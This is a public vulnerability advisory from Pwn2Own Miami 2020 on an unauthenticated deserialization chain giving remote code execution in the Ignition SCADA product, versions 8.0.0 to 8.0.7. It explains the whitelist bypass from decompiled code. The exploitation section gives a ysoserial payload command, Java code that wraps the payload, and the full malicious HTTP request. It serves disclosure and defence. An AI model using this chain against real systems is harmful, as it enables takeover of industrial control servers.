rce\_me\_v2
=======
***

# Summary

This advisory describes a chain of Java vulnerabilities that were found by **Pedro Ribeiro ([@pedrib1337](https://twitter.com/pedrib1337) | pedrib@gmail.com)** and **Radek Domanski ([@RabbitPro](https://twitter.com/RabbitPro) | radek.domanski@gmail.com)** and were used in [ZDI's](https://www.zerodayinitiative.com/) **Pwn2Own Miami 2020** competition in January 2020.

The vulnerabilities described in this document are present in the **Inductive Automation Ignition** (Ignition) SCADA product, on versions 8.0.0 up to (and including) 8.0.7.

The default configuration is exploitable by an unauthenticated attacker, which can achieve remote code execution as SYSTEM on a Windows installation or root in Linux.

The exploit chains three vulnerabilities to achieve code execution:

* Unauthenticated Access to Sensitive Resource
* Insecure Java Deserialization
* Use of Insecure Java Library

All code snippets in this advisory were obtained by decompiling JAR files from version 8.0.7.

## Note

This advisory was disclosed publicly on 11.06.2020.

A special thanks to the [Zero Day Initiative](https://www.zerodayinitiative.com/) (ZDI) for hosting us in the amazing Pwn2Own competition and allowing us to release this information to the public.

Copies of this advisory are available on GitHub at:

* [Pedro's GitHub](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Miami_2020/rce_me_v2/rce_me_v2.md)
* [Radek's GitHub](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Miami2020/rce_me_v2.md)

The following CVE numbers have been assigned:

* [CVE-2020-10644](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10644)
* [CVE-2020-12004](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12004)

ZDI's advisories can be found at:

* [ZDI-20-685](https://www.zerodayinitiative.com/advisories/ZDI-20-685/)
* [ZDI-20-686](https://www.zerodayinitiative.com/advisories/ZDI-20-686/)

And their blog post:

* [A trio of bugs used to exploit Inductive Automation at Pwn2Own Miami](https://www.zerodayinitiative.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami)

A Metasploit module was also made available to the public with this advisory, and can be found at:

* [inductive_ignition_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/scada/inductive_ignition_rce.rb)

**This module can be seen in action in a YouTube video below** (there is also a video file in the same directory as this advisory):

[![Watch the video](https://img.youtube.com/vi/CuOancRm1fg/maxresdefault.jpg)](https://www.youtube.com/watch?v=CuOancRm1fg)

~ Team Flashback


# Vulnerability Details

## Background on Ignition and the */system/gateway* endpoint

Ignition listens on a large number of TCP and UDP ports, as it has to handle several SCADA protocols and its own functionality.
The main ports are TCP 8088 and TCP/TLS 8043, which are used to control the administrative server over HTTP(S), as well as handle communication between various Ignition components.

There are a number of API endpoints listening on that port, but the one abused in this advisory is at */system/gateway*. This API endpoint allows the user to perform remote function calls, however only a few can be called by unauthenticated user (*Login.designer()* is one of them). It communicates with clients using XML that contains serialized Java objects in it, and its code resides in the *com.inductiveautomation.ignition.gateway.servlets.Gateway* class.

Usually performing client-server communications with serialized Java objects leads to direct code execution, but in this case it is not that simple. 
Before we dive into that, let's look at what a *Login.designer()* request looks like:

```xml
POST /system/gateway HTTP/1.1
Content-type: text/xml
User-Agent: Java/11.0.4
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 845

<?xml version="1.0" encoding="UTF-8"?>
<requestwrapper>
    <version>964325727</version>
    <scope>2</scope>
    <message>
        <messagetype>199</messagetype>
        <messagebody>
            <arg name="funcId"><![CDATA[Login]]></arg>
            <arg name="subFunction"><![CDATA[designer]]></arg>
            <arg name="arg" index="0"><![CDATA[H4sIAAAAAAAAAFvzloG1hMG1Wqm0OLUoLzE3VTc1L1nJSinFMMnQyDApMdnEyCzJyDhVSUepILG4uDy/KAWXiloAvpMDvEwAAAA=]]></arg>
            <arg name="arg" index="1"><![CDATA[H4sIAAAAAAAAAFvzloG1uIhBMCuxLFEvJzEvXc8zryQ1PbVI6NGCJd8b2y2YGBg9GVjLEnNKUyuKGAQQ6vxKc5NSi9rWTJXlnvKgm4mBoaKgItLQAACH6ksSUQAAAA==]]></arg>
            <arg name="arg" index="2"><![CDATA[H4sIAAAAAAAAAFvzloG1hIHXtbQovyBV3yc/LyU/DwDHsV9XFAAAAA==]]></arg>
            <arg name="arg" index="3"><![CDATA[H4sIAAAAAAAAAFvzloG1hIHfxTXYO8Q/QNc/MDDE1MkYAOTFO60WAAAA]]></arg>
        </messagebody>
    </message>
    <locale>
        <l>en</l>
        <c>GB</c>
        <v></v>
    </locale>
</requestwrapper>
```
> Snippet 1: *Login.designer()* request



And its response:

```xml
HTTP/1.1 200 OK
Date: Sun, 24 Nov 2019 00:33:56 GMT
Content-Type: text/xml
Server: Jetty(9.4.8.v20180619)
Content-Length: 1254

<?xml version="1.0" encoding="UTF-8"?>
<ResponseWrapper>
    <Response>
        <SerializedResponse>H4sIAAAAAAAAAKVUz2sTQRid/NgktbUmFlp66EH00ktyEyFCTSvFaFq
FqrT04mR3spkwu7POzKbbIIVeitCDpSpSRVrQi1D04F9QPAiiQgv24EUPXoVevfnNbpK2eFFcyGb5vjffj/fe7vZPZEiBJkzu
5Klr+aaiTYJ9xR2sKHfz1HZp+AAAB/58SUR+HEtqlnxVJ66iJlbEugXh4Oa9D1Ovx4biKFZBPYo6
RCrseAplKw3cxAVfUVa4DOhiIND5f2+oe+wMLa0Mz8VycWRUUK/JXYVNVXZr/HiXCpWqWEFxaik0
GMUpL8wQQTGjLVxlBLK9nuA1ysg0dohCpyMYw65dmFGCujZADMEZbNGpEdae4IwRU48IgAFp1onl
M1KyGr5UDhAi76IllIAVx/52RVijRu1oyRuCe0SoxRkYKbpiIZ+pJma+HuXUkVGmsFcMPJAvp2N5
HctfwbIOcSP9defd4J3dBIpPohOMY2sSmOKiDMrUBZF1zqzAG7sUtuhbyMA9C780FLv4P3OTN7tb
Jb+QjqNkGRl1k1sEaDQZbrUUyh3heIJhKYHBPovUsM/Ubb3fcRmuVxtANGCSLkikaTUCz1h/9qIp
UDbcWMPykVpbBy8vtIpvx+MIBR6Yzqhiy9Ykhnr07dfWn+iHnEKpElvAi0BlpiNeNxZh07/8YoiF
Mj01KqRyQ4u0S6XGp3c6acPlSqvSTm3uPZxtd4mDFVBGD+hjm3hR/mD0/n7naEY7OyqcMrEgCkeY
V/17Z7oYIKnTPJDtt8bm3GbkUITQjvmy4/hKO1t7/1zH6sSa5MJpOwmBk+ZRhjAS+lShgfk/2Q48
X3QSEb/txNrn2c2sHGUhwboazNN/iKpweGNWf6x9fHD2G/S5iozQscExqaZ9p0rEyvbjkd5H31e7
lbTLFUq3nQB1Bw79XBICL+qdguW9kY33+HkCxcooKWG38HBsIRkdP1myHOoCUGDweaApHO2OGJbS
3556Yzl2bU4NJ3RvbfuY+/TLxqfgN5dVns8IBQAA</SerializedResponse>
        <errorNo>0</errorNo>
    </Response>
    <SetCookie>D07B61A39DAE828E35134292A70777A4</SetCookie>
</ResponseWrapper>
```
> Snippet 2: *Login.designer()* response



The request and response contain serialized Java objects that are passed to the functions that can be called remotely. The example above shows a call to the *designer()* function of the *com.inductiveautomation.ignition.gateway.servlets.gateway.functions.Login* class with 4 arguments.

The call stack before we reach *Login.designer()* is as follows:

```
com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost()
com.inductiveautomation.ignition.gateway.servlets.gateway.AbstractGatewayFunction.invoke()
com.inductiveautomation.ignition.gateway.servlets.gateway.functions.Login.designer()
```

*Gateway.doPost()* performs some version and sanity checks, and then sends the request to *AbstractGatewayFunction.invoke()*, which parses and validates it before calling *Login.designer()*, as shown below:

```java
    public final void invoke(GatewayContext context, PrintWriter out, ClientReqSession session, String projectName, Message msg) {
        String funcName = msg.getArg("subFunction");
        AbstractGatewayFunction.SubFunction function = null;
        if (TypeUtilities.isNullOrEmpty(funcName)) {
            function = this.defaultFunction;
        } else {
            function = (AbstractGatewayFunction.SubFunction)this.functions.get(funcName);
        }

        if (function == null) {
            Gateway.printError(out, 500, "Unable to locate function '" + this.getFunctionName(funcName) + "'", (Throwable)null);
        } else if (function.reflectionErrorMessage != null) {
            Gateway.printError(out, 500, "Error loading function '" + this.getFunctionName(funcName) + "'", (Throwable)null);
        } else {
            Set<Class<?>> classWhitelist = null;
            int i;
            Class argType;
            if (!this.isSessionRequired()) {
                classWhitelist = Sets.newHashSet(SaferObjectInputStream.DEFAULT_WHITELIST);
                Class[] var9 = function.params;
                int var10 = var9.length;

                for(i = 0; i < var10; ++i) {
                    argType = var9[i];
                    classWhitelist.add(argType);
                }

                if (function.retType != null) {
                    classWhitelist.add(function.retType);
                }
            }

            List<String> argList = msg.getIndexedArg("arg");
            Object[] args;
            if (argList != null && argList.size() != 0) {
                args = new Object[argList.size()];

                for(i = 0; i < argList.size(); ++i) {
                    if (argList.get(i) == null) {
                        args[i] = null;
                    } else {
                        try {
                            args[i] = Base64.decodeToObjectFragile((String)argList.get(i), classWhitelist);
                        } catch (ClassNotFoundException | IOException var15) {
                            ClassNotFoundException cnfe = null;
                            if (var15.getCause() instanceof ClassNotFoundException) {
                                cnfe = (ClassNotFoundException)var15.getCause();
                            } else if (var15 instanceof ClassNotFoundException) {
                                cnfe = (ClassNotFoundException)var15;
                            }

                            if (cnfe != null) {
                                Gateway.printError(out, 500, this.getFunctionName(funcName) + ": Argument class not valid.", cnfe);
                            } else {
                                Gateway.printError(out, 500, "Unable to read argument", var15);
                            }

                            return;
                        }
                    }
                }
            } else {
                args = new Object[0];
            }

            if (args.length != function.params.length) {
                String var10002 = this.getFunctionName(funcName);
                Gateway.printError(out, 202, "Function '" + var10002 + "' requires " + function.params.length + " arguments, got " + args.length, (Throwable)null);
            } else {
                for(i = 0; i < args.length; ++i) {
                    argType = function.params[i];
                    if (args[i] != null) {
                        try {
                            args[i] = TypeUtilities.coerce(args[i], argType);
                        } catch (ClassCastException var14) {
                            Gateway.printError(out, 202, "Function '" + this.getFunctionName(funcName) + "' argument " + (i + 1) + " could not be coerced to a " + argType.getSimpleName(), var14);
                            return;
                        }
                    }
                }

                try {
                    Object[] fullArgs = new Object[args.length + 3];
                    fullArgs[0] = context;
                    fullArgs[1] = session;
                    fullArgs[2] = projectName;
                    System.arraycopy(args, 0, fullArgs, 3, args.length);
                    if (function.isAsync) {
                        String uid = context.getProgressManager().runAsyncTask(session.getId(), new MethodInvokeRunnable(this, function.method, fullArgs));
                        Gateway.printAsyncCallResponse(out, uid);
                        return;
                    }

                    Object obj = function.method.invoke(this, fullArgs);
                    if (obj instanceof Dataset) {
                        Gateway.datasetToXML(out, (Dataset)obj);
                        out.println("<errorNo>0</errorNo></Response>");
                    } else {
                        Serializable retVal = (Serializable)obj;
                        Gateway.printSerializedResponse(out, retVal);
                    }
                } catch (Throwable var16) {
                    Throwable ex = var16;
                    Throwable cause = var16.getCause();
                    if (var16 instanceof InvocationTargetException && cause != null) {
                        ex = cause;
                    }

                    int errNo = 500;
                    if (ex instanceof GatewayFunctionException) {
                        errNo = ((GatewayFunctionException)ex).getErrorCode();
                    }

                    LoggerFactory.getLogger("gateway.clientrpc.functions").debug("Function invocation exception.", ex);
                    Gateway.printError(out, errNo, ex.getMessage() == null ? "Error executing gateway function." : ex.getMessage(), ex);
                }

            }
        }
    }
```
> Snippet 3: *AbstractGatewayFunction.invoke()*


This function does the following:

1. Parses the received message
2. Identifies the function to be called
3. Checks the function arguments
    * Ensures the function arguments are safe to be deserialized
    * Ensures that the number of arguments corresponds to the expected for the target function
4. Calls the function with the deserialized arguments
5. Sends the response back to the client

Before being deserialized, the arguments are checked to ensure they contain "safe" objects. This is done by calling *decodeToObjectFragile()* from *com.inductiveautomation.ignition.common.Base64*. This function takes takes two arguments: a String with a Base64 encoded object, and a whitelist of classes that are safe to deserialize:

```java
    public static Object decodeToObjectFragile(String encodedObject, Set<Class<?>> classWhitelist) throws ClassNotFoundException, IOException {
        byte[] objBytes = decode(encodedObject, 2);
        ByteArrayInputStream bais = null;
        ObjectInputStream ois = null;
        Object obj = null;

        try {
            bais = new ByteArrayInputStream(objBytes);
            if (classWhitelist != null) {
                ois = new SaferObjectInputStream(bais, classWhitelist);
            } else {
                ois = new ObjectInputStream(bais);
            }

            obj = ((ObjectInputStream)ois).readObject();
        } finally {
            try {
                bais.close();
            } catch (Exception var15) {
            }

            try {
                ((ObjectInputStream)ois).close();
            } catch (Exception var14) {
            }

        }

        return obj;
    }
```

> Snippet 4: *decodeToObjectFragile()* in *com.inductiveautomation.ignition.common.Base64*


As it can be seen above, if *decodeToObjectFragile()* receives *null* instead of a whitelist of allowed classes, it uses a "normal" *ObjectInputStream* to deserialize the object, with all the problems and insecurity it brings. 
However if a whitelist of classes is received, it uses the *SaferObjectInputStream* class instead to deserialize the object.

*SaferObjectInputStream* is a wrapper around *ObjectInputStream* that checks every object being deserialized and if the object is not part of the whitelist, it rejects all input and terminates processing before any harmful effects occur:

```java
public class SaferObjectInputStream extends ObjectInputStream {
    public static final Set<Class<?>> DEFAULT_WHITELIST = ImmutableSet.of(String.class, Byte.class, Short.class, Integer.class, Long.class, Number.class, new Class[]{Float.class, Double.class, Boolean.class, Date.class, Color.class, ArrayList.class, HashMap.class, Enum.class});
    private final Set<String> whitelist;

    public SaferObjectInputStream(InputStream in) throws IOException {
        this(in, DEFAULT_WHITELIST);
    }

    public SaferObjectInputStream(InputStream in, Set<Class<?>> whitelist) throws IOException {
        super(in);
        this.whitelist = new HashSet();
        Iterator var3 = whitelist.iterator();

        while(var3.hasNext()) {
            Class<?> c = (Class)var3.next();
            this.whitelist.add(c.getName());
        }

    }

    protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException {
        ObjectStreamClass ret = super.readClassDescriptor();
        if (!this.whitelist.contains(ret.getName())) {
            throw new ClassNotFoundException(String.format("Unexpected class %s encountered on input stream.", ret.getName()));
        } else {
            return ret;
        }
    }
}
```

> Snippet 5: *com.inductiveautomation.ignition.common.util.SaferObjectInputStream*



As it can be seen in the snippet above, the default whitelist (*DEFAULT_WHITELIST*) is very strict, only allowing the following object types to be deserialized:

* String
* Byte
* Short
* Integer
* Long
* Number
* Float
* Double
* Boolean
* Date
* Color
* ArrayList
* HashMap
* Enum

Since these are generally very simple types, **the mechanism described here is an effective way to stop most Java deserialization attacks.**


It is out of scope of this advisory to explain Java deserialization, how it happens and how devastating it can be. For more information on this vulnerability, the following links are highly recommended:

[Java Unmarshaller Security](https://github.com/mbechler/marshalsec)

[Foxglove Security Blog Post](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)


## Vulnerability 1: Unauthenticated Access to Sensitive Resource

The first vulnerability in this chain is actually an information leak, but not used as such in the exploit presented in this advisory.
An unauthenticated attacker can invoke the "project diff" functionality, and obtain crucial information about a project, or, as in our case, to use this as a springboard to attack other functionality.

The *com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload* class contains a number of actions that are accessible by an unauthenticated remote attacker, and one of them is *getDiffs()*, which is shown below:

```java
  @GatewayFunction
  public String getDiffs(GatewayContext context, HttpSession session, String sessionProject, String projectSnapshotsBase64) throws GatewayFunctionException {
    try {
      List<ProjectSnapshot> snapshots = (List<ProjectSnapshot>)Base64.decodeToObjectFragile(projectSnapshotsBase64);

      RuntimeProject p = ((RuntimeProject)context.getProjectManager().getProject(sessionProject).orElseThrow(() -> new ProjectNotFoundException(sessionProject))).validateOrThrow();
      
      List<ProjectDiff.AbsoluteDiff> diffs = context.getProjectManager().pull(snapshots);
      
      return (diffs == null) ? null : Base64.encodeObject(Lists.newArrayList(diffs));
    } catch (Exception e) {
      throw new GatewayFunctionException(500, "Unable to load project diff.", e);
    } 
  }
```
> Snippet 6: *getDiffs()* in *com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload*



As it can be seen above, this function compares the provided data with the project data in the server, and returns a diff. If an attacker provides a valid project name, it is possible to trick the server into handing over all the project data.

However, as said previously, this functionality is not used in the exploit, but instead this function is used as a springboard to further attack the system, which will be further explained below.



## Vulnerability #2: Insecure Java Deserialization

As it can be seen in *Snippet 6*, *ProjectDownload.getDiffs()* uses *Base64.decodeToObjectFragile()* function to decode project data. 

This function was already explained in *Snippet 4*, and a key detail was provided: if no class whitelist is given as a second argument to the function, it uses the standard unsafe *ObjectInputStream* class to decode the given object.

This leads to a classical Java deserialization vulnerability, which ultimately results in remote code execution when chained with the final vulnerability.



## Vulnerability #3: Use of Insecure Java Library

The final link in this chain is to abuse a Java class that contains vulnerable Java gadget objects that can be used to achieve remote code execution. And luckily for us, Ignition has exactly that - it uses a very old version of Apache Commons Beanutils, version 1.9.2, which is from 2013.

There is a payload for this library in the famous [*ysoserial* Java deserialization exploitation tool](https://github.com/frohoff/ysoserial), which is named [*CommonsBeanutils1*](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java). 


# Exploitation

## Walkthrough

To summarize, in order to achieve remote code execution, we need to do the following:

1. Create an [*ysoserial CommonsBeanutils1*](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java) payload to be executed on the target
2. Base64 encode the payload
3. Encapsulate the payload in a Java String object
4. Serialize the String object using the standard Java serialization functionality
5. Base64 encode the serialized String object
6. Send a request to */system/gateway* invoking *getDiffs()* with the malicious parameters

We're able to bypass the serialization whitelist and execute our code! But how? Let's dig into it.

Our payload will have the following format:

```
base64(String(base64(YSOSERIAL_PAYLOAD))
```

The code shown in *Snippet 3* will perform Base64 decoding on it, which will result in:

```
String(base64(YSOSERIAL_PAYLOAD))
```

This is checked against the whitelist shown in in the previous section, and allowed to be deserialized since it's a *String* class.

We then go into *ProjectDownload.getDiffs()*, where it takes our String argument and then calls *Base64.decodeToObjectFragile()* on it without specifying a whitelist.

As shown in *Snippet 4*, this will Base64 decode the String and then invoke *ObjectInputStream.readObject()* on our malicious object *YSOSERIAL_PAYLOAD*, resulting in code execution!

## Payload generation

To create our payload, we start by calling ysoserial as shown below:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'cmd /c "whoami > C:\\flashback.txt"' | base64 -w 0
```
> Snippet 7: *ysoserial CommonsBeanutils1* payload generation and base64 encoding



Then the following Java code can be used to encapsulate a payload inside a String and serialize it to disk:

```java
    public static void main(String[] args) {
        try {
            String payload = "<YSOSERIAL_BASE64_PAYLOAD>";
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(bos);
            objectOutputStream.writeObject(payload);
            objectOutputStream.close();
            byte[] encodedBytes = Base64.getEncoder().encode(bos.toByteArray());
            FileOutputStream fos = new FileOutputStream("/tmp/output");
            fos.write(encodedBytes);
            fos.close();
            bos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
```
> Snippet 8: Payload generation code



In this code, `<YSOSERIAL_BASE64_PAYLOAD>` should contain the output of *Snippet 7*.

Finally we send the following request to the target:

```xml
POST /system/gateway HTTP/1.1
Content-type: text/xml
User-Agent: Java/11.0.4
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 1337

<?xml version="1.0" encoding="UTF-8"?>
<requestwrapper>
    <version>1184437744</version>
    <scope>2</scope>
    <message>
        <messagetype>199</messagetype>
        <messagebody>
            <arg name="funcId"><![CDATA[ProjectDownload]]></arg>
            <arg name="subFunction"><![CDATA[getDiff]]></arg>
            <arg name="arg" index="0"><![CDATA[<PAYLOAD>]]></arg>
        </messagebody>
    </message>
    <locale>
        <l>en</l>
        <c>GB</c>
        <v></v>
    </locale>
</requestwrapper>
```
> Snippet 9: Exploit payload


`<PAYLOAD>` will contain the output of running *Snippet 8*.

The target will respond with:

```xml
HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 10:17:55 GMT
Content-Type: text/xml
Server: Jetty(9.4.20.v20190813)
Content-Length: 7760

<?xml version="1.0" encoding="UTF-8"?>
<ResponseWrapper>
    <Response>
        <errorNo>500</errorNo>
        <errorMsg>Unable to load project diff.</errorMsg>
        <StackTrace>
            <ExceptionMsg>Unable to load project diff.</ExceptionMsg>
            <ExceptionString>com.inductiveautomation.ignition.gateway.servlets.gateway.functions.GatewayFunctionException: Unable to load project diff.</ExceptionString>
            <ExceptionCls>com.inductiveautomation.ignition.gateway.servlets.gateway.functions.GatewayFunctionException</ExceptionCls>
            <ExceptionOTS>false</ExceptionOTS>
            <StackTraceElem>
                <decl>com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload</decl>
                <meth>getDiff</meth>
                <file>ProjectDownload.java</file>
                <line>52</line>
            </StackTraceElem>
            <StackTraceElem>
                <decl>jdk.internal.reflect.NativeMethodAccessorImpl</decl>
                <meth>invoke0</meth>
                <file>null</file>
                <line>-2</line>
            </StackTraceElem>
            <StackTraceElem>
                <decl>jdk.internal.reflect.NativeMethodAccessorImpl</decl>
                <meth>invoke</meth>
                <file>null</file>
                <line>-1</line>
            </StackTraceElem>
            <StackTraceElem>
                <decl>jdk.internal.reflect.DelegatingMethodAccessorImpl</decl>
                <meth>invoke</meth>
                <file>null</file>
                <line>-1</line>
            </StackTraceElem>
(...)
```
> Snippet 10: Response to exploit payload



The response contains a stack trace indicating something went wrong, but the payload was actually executed as SYSTEM (or root on Linux).

With the payload provided in *Snippet 7*, a file will appear in *C:\flashback.txt* with the text *nt authority\system*, demonstrating we have achieved **unauthenticated remote code execution**.
